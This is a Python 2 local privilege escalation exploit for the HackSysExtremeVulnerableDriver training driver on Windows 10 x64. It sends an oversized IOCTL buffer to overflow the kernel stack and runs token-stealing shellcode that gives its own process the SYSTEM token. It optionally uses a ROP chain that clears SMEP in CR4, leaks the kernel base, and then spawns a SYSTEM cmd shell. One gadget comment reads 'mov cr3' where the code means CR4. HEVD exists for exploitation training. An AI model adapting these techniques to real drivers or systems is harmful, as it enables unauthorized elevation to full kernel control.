#!/usr/bin/python
#
# HackSysExtremeVulnerableDriver (HEVD) Windows x64 Kernel exploit
#   Stack Overflow x64 + with SMEP bypass via ROP
#   (working/tested under Windows 10 x64 1703, 15063.608)
# 
# Mariusz Banach / mgeeky, '17
#

import os
import sys
import struct
import ctypes
import platform
import ctypes.wintypes

# Insert breakpoints to the kernel shellcode?
INSERT_INT3                 = False

# If under VM - SMEP may be not needed, otherwise - switch this to true
# The VirtualBox's been found Meditation Guru-crashing VM during CR4 overwrite,
# possibly due to Hyper-V overreaction.
USE_SMEP_BYPASS             = False

# Driver's informations.
HEVD_FILE_NAME              = ur"\\.\HackSysExtremeVulnerableDriver"
IOCTL_CODE                  = 0x00222003


# ----- SYSTEM VERSION DEPENDENT HADRCODED VALUES -----

# Valid for:
#   Windows 10 Kernel Version 1703 / 15063 MP (2 procs) Free x64
#   Built by: 15063.0.amd64fre.rs2_release.170317-1834
CURRENT_THREAD              = 0x188         # nt!_KPCR.Pcrb.CurrentThread (_KTHREAD)
APC_PROCESS                 = 0x98 + 0x20   # _KTHREAD.ApcState.Process
ACTIVE_PROC_LINKS           = 0x2e8         # _EPROCESS.ActiveProcessLinks
TOKEN_OFFSET                = 0x358         # _EPROCESS.Token

# nt!ExInitializeLookasideListEx+0x41: 
#   fffff802`de28d941: pop rax ; ret
GADGET1_SET_RAX             = 0x00006941

# nt!KiFlushCurrentTbWorker+0x19: 
#   fffff802`de38ce59: mov cr3, rax ; ret
GADGET2_SET_CR4             = 0x00105e59

# The value for the CR4 with the SMEP/SMAP bits turned off
VALID_CR4_VALUE             = 0x000406f8

# ----- SYSTEM VERSION DEPENDENT HADRCODED VALUES -----


# Windows Constants
GENERIC_READ                = 0x80000000
FILE_SHARE_READ             = 1
FILE_SHARE_WRITE            = 2
OPEN_EXISTING               = 3
LANG_ENGLISH                = 9
SUBLANG_DEFAULT             = 1
FORMAT_MESSAGE_FROM_SYSTEM  = 0x00001000
FILE_ATTRIBUTE_NORMAL       = 0x00000080
FILE_FLAG_OVERLAPPED        = 0x40000000
MEM_COMMIT                  = 0x1000
MEM_RESERVE                 = 0x2000
PAGE_EXECUTE_READWRITE      = 0x40


class Driver:
    fileName = ''

    def __init__(self, fileName):
        self.fileName = fileName

    def __exit__(self):
        if self.handle:
            ctypes.windll.kernel32.CloseHandle(self.handle)

    def open(self):
        self.handle = ctypes.windll.kernel32.CreateFileW(
            self.fileName,
            GENERIC_READ,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            None,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
            None
        )

        if not self.handle or self.handle == -1:
            print "[!] Could not open Driver's handle: " + formatError()
            return False

        print '[+] Driver: "{}" opened, handle: 0x{:04x}'.format(self.fileName, self.handle)
        return True


    def sendIoctl(self, ioctl, inpBuf, inputSize):
        ret = ctypes.c_ulong()
        inputBuf = getPtr(inpBuf)

        print '[+] Sending IOCTL: 0x{:08x}, input addr: 0x{:08x}, size: {}'.format(ioctl, inputBuf, inputSize)
        sys.stdout.flush()
        
        out = ctypes.windll.kernel32.DeviceIoControl(
            self.handle, 
            ioctl, 
            inputBuf, 
            inputSize, 
            None, 
            0, 
            ctypes.byref(ret), 
            None 
        )

        if not out:
            print '[!] IOCTL Failed: ' + formatError()

        return out

def formatError():
    errCode = ctypes.windll.kernel32.GetLastError()
    buff = ctypes.create_string_buffer(1024)
    ctypes.windll.kernel32.FormatMessageA(
        FORMAT_MESSAGE_FROM_SYSTEM,
        0,
        errCode,
        (((SUBLANG_DEFAULT) << 10) | (LANG_ENGLISH)),
        buff,
        1024,
        0
    )

    return 'error: {!s}, {}'.format(errCode, repr(buff.value.strip()))


def shellcode():
    tokenDiff = ((TOKEN_OFFSET - ACTIVE_PROC_LINKS) & 0xff)

    shellc = ""

    if INSERT_INT3: 
        print '[?] Shellcode is using INT3 opcodes.'
        shellc += "\x90\xcc\x90"

    shellc += "\x51"                                                                    # push rcx
    shellc += "\xB9" + struct.pack("<I", os.getpid())                                   # mov ecx, PID
    shellc += "\x65\x48\x8B\x04\x25" + struct.pack('<H', CURRENT_THREAD) + "\x00\x00"   # mov rax, gs:0x188
    shellc += "\x48\x8B\x80" + struct.pack('<H', APC_PROCESS) + "\x00\x00"              # mov rax, [rax + EPROCESS]
    shellc += "\x48\x8d\x80" + struct.pack('<H', ACTIVE_PROC_LINKS) + "\x00\x00"        # lea rax, [rax + ActiveProcessLink]
    
    shellc += "\x48\x8b\x00"                                                            # mov rax, [rax]       ; _LIST_ENTRY.Flink
    shellc += "\x48\x8b\x58\xf8"                                                        # mov rbx, [rax-0x8]   ; UniqueProcessID
    shellc += "\x48\x83\xfb\x04"                                                        # cmp rbx, 0x4         ; PID == 4 -> SYSTEM
    shellc += "\x75\xf3"                                                                # jne
    shellc += "\x48\x8b\x58" + struct.pack('<B', tokenDiff)                             # mov rbx,  [rax+ Token]
    
    shellc += "\x53"                                                                    # push rbx
    shellc += "\x48\x8b\x00"                                                            # mov rax, [rax]
    shellc += "\x48\x8b\x58\xf8"                                                        # mov rbx, [rax-0x8]   ; UniqueProcessID
    shellc += "\x39\xcb"                                                                # cmp ebx, ecx         ; our PID
    shellc += "\x75\xf5"                                                                # jne
    shellc += "\x5b"                                                                    # pop rbx
    shellc += "\x48\x89\x58" + struct.pack('<B', tokenDiff)                             # mov [rax + Token], rbx
    
    shellc += "\x48\x8b\x5c\x24\x58"                                                    # mov rbx, [rsp+0x58]  ; Restore _IRP
    shellc += "\x48\x89\xdf"                                                            # mov rdi, rbx
    shellc += "\x59"                                                                    # pop rcx
    shellc += "\x48\x31\xC0"                                                            # xor rax, rax         ; NTSTATUS -> STATUS_SUCCESS
    shellc += "\x48\x83\xC4\x28"                                                        # add rsp, 0x28
    
    if INSERT_INT3: shellc += "\xcc"
    shellc += "\xC3"                                                                    # ret

    return (getPtr(shellc), len(shellc))


def allocateShellcode():
    shellcAddr, shellcSize = shellcode()
    print '[+] Original shellcode stored at: 0x{:08x}, with size: {}'.format(shellcAddr, shellcSize)

    allocd = ctypes.windll.kernel32.VirtualAlloc(
        None,
        0x1000,
        (MEM_COMMIT | MEM_RESERVE),
        PAGE_EXECUTE_READWRITE
    )

    if not allocd:
        print "[!] Could not allocate buffer for the shellcode: " + formatError()
        return 0

    fill = "\x90" * 0x1000
    ctypes.memmove(allocd, fill, 0x1000)
    ctypes.memmove(allocd, shellcAddr, shellcSize)

    return allocd, shellcSize

def getPtr(buf):
    return id(buf) + 32

def getKernelBase():
    imageBase = (ctypes.c_ulonglong * 1024)()
    cb = ctypes.c_uint32(1024)
    needed = ctypes.c_longlong()

    ctypes.windll.psapi.EnumDeviceDrivers.argtypes = \
        [ctypes.c_void_p, ctypes.c_uint32, ctypes.POINTER(ctypes.c_longlong)]
        
    res = ctypes.windll.psapi.EnumDeviceDrivers(
        ctypes.byref(imageBase),
        cb,
        ctypes.byref(needed)
    )
    if not res:
        print "\t[!] Failed getting kernel base: " + formatError()
        return 0

    print '[+] Acquired kernel base: 0x{:x}'.format(imageBase[0])
    
    return imageBase[0]

def exploit(drv):
    shellcodeAddress, shellcSize = allocateShellcode()
    kernelBase = getKernelBase()

    if not shellcodeAddress:
        print '[!] Shellcode has not been allocated properly.'
        return False

    if not kernelBase:
        return False
    
    buff_len = 2056 + 8
    junk = "A" * (buff_len - 8)

    if USE_SMEP_BYPASS:
        buff = (
            # Junk overflowing the stack-based buffer
            junk + 

            # SMEP bypass ROP constructed from:
            #   pop rax         ; rax := valid cr4 value
            #   ret
            #   mov cr4, rax    ; set cr4 with SMEP bits turned off
            #   ret
            struct.pack('<Q', kernelBase + GADGET1_SET_RAX) +
            struct.pack('<Q', VALID_CR4_VALUE) +
            struct.pack('<Q', kernelBase + GADGET2_SET_CR4) +

            # And finally return address pointing at the kernel shellcode
            struct.pack('<Q', shellcodeAddress)
        )
    else:
        buff = (
            junk + 
            struct.pack('<Q', shellcodeAddress)
        )

    if drv.sendIoctl(IOCTL_CODE, buff, buff_len):
        print '[+] Exploit may have succeeded!\n\n'

        ctypes.windll.kernel32.WinExec("cmd")

        return True

    print '[-] Exploit has failed.'
    return False


def main(argv):
    print '''
    HackSysExtremeVulnerableDriver
    Local Privilege Escalation exploit
        Stack Overflow (x64) {}
    Mariusz Banach / mgeeky, '17
'''.format('' if not USE_SMEP_BYPASS else '+ with SMEP bypass')
    
    if platform.architecture()[0] != '64bit':
        raise Exception("This exploit must be run from Python 2.7 x64 bit")

    drv = Driver(HEVD_FILE_NAME)
    if not drv.open():
        return False

    return exploit(drv)

if __name__ == '__main__':
    main(sys.argv)
